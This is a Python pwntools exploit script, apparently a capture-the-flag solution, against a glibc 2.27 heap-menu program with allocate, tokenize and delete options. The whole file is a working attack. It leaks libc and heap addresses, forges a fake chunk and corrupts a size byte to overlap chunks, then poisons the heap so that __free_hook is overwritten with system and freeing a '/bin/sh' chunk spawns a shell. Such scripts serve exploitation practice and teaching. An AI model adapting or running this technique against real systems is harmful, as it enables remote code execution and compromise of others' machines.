#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
# libc = ELF(elf.libc)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or ''
	port = int(args.PORT or 1337)
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# tbreak main
dir ./glibc-2.27
set substitute-path '/build/glibc-CVJwZb/glibc-2.27' './glibc-2.27'
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn([], env=env)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


def strr(size, data):
	# info(f"str({size}, {data})")
	sla(b'>', b'1')
	sla(b'size?', str(size).encode())
	sla(b'str?', data)
	line = rl() # stored at 0!
	line = line.decode()[:-1]
	line = line.split(' ')[-1][:-1]
	# info(f"ret = {line}")
	return int(line)


def tok(idx, delim):
	# info(f"tok({idx}, {delim})")
	sla(b'>', b'2')
	sla(b'idx?', str(idx).encode())
	sla(b'delim?', delim)

def dell(idx):
	# info(f"del({idx})")
	sla(b'>', b'3')
	sla(b'idx?', str(idx).encode())


unsorted = strr(0x600, b'A' * 0x600) # unsorted
first_preventer = strr(0x10, b'a' * 0x10)  # prevent top consolidation
dell(unsorted)

leaker = strr(0x8, b'B' * 0x8)
tok(leaker, b'B')
libc_leak = u64(rl().strip().ljust(8, p8(0)))
info(f'libc_leak {libc_leak:#x}')

libc_base = libc_leak - 0x3ec110
libc = exe.libc
libc.address = libc_base
success(f'libc.address {libc.address:#x}')

# allocate leaker again to leak heap addr
dell(leaker)
leaker = strr(0x10, b'B' * 0x10)
tok(leaker, b'B')
heap_leak = u64(rl().strip().ljust(8, p8(0)))
info(f'heap_leak {heap_leak:#x}')

heap_base = heap_leak - 0x250
success(f'heap_base {heap_base:#x}')





# craft fake chunk for  unlink
strr(0x600-0x20, flat(
	b'X' * 0x588,
	p64(0x330), # fake chunk size
	p64(heap_base+0x820-0x10), # fd (point to chunk below)
	p64(heap_base+0x820-0x10), # bk (point to chunk below)

	p64(heap_base+0x810-0x10), # fd (point to chunk above)
	p64(heap_base+0x810-0x10), # bk (point to chunk above)
))
kuba = strr(0x2a8, b'B' * 0x2a8)

first = strr(0x600-0x10, b'B' * (0x600-0x10))
strr(0x10, b'1' * 0x10)  # prevent top consolidation

tok(kuba, b'\x01')  # change lower byte of size field
dell(kuba)
kuba = strr(0x2a8, flat(
	b'C' * 0x2a0,
	p64(0x330) # fake prev_size
))
dell(kuba)


dell(first_preventer)
first_preventer = strr(0x18, b'a' * 0x18)

dell(first)
dell(strr(0x18, b'a' * 0x18))
dell(first_preventer)

__free_hook = libc.sym['__free_hook']
info(f'__free_hook: {__free_hook:#x}')

strr(0x100, flat(
	cyclic(0x40),
	p64(__free_hook)
))

shell = strr(0x10, b'/bin/sh')
strr(0x10, p64(libc.sym.system))
dell(shell)
info("Shell time!")

ia()
